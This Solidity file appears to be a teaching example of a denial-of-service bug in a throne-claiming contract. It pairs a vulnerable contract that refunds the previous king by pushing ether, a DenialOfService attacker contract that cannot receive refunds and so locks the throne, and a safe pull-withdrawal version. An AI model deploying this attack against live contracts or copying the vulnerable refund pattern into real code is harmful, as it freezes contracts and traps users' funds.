// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract KingContract {

    address public king;
    uint public amount;

    function claimThrone() public payable {
        require(msg.value > amount, "Need amount greater than current king");
        
        (bool sent, ) = payable(king).call{value: amount}("");
        require(sent, "Failed to send ether");

        king = msg.sender;
        amount = msg.value;
    }
    
}

contract DenialOfService {

    KingContract public king;

    constructor(KingContract _king) {
        king = KingContract(_king);
    }

    function attack() public payable {
        king.claimThrone{value: msg.value}();
    }

}


contract SafeKingContract {

    address public king;
    uint public amount;
    mapping(address => uint) balances;

    function claimThrone() public payable {
        require(msg.value > amount, "Need amount greater than current king");

        balances[msg.sender] += msg.value;
        king = msg.sender;
        amount = msg.value;
    }

    function withdraw() public payable {
        require(msg.sender != king, "Current king cannot withdraw");

        uint balance = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = payable(msg.sender).call{value: balance}("");
        require(sent, "Failed to send ether");
    }

}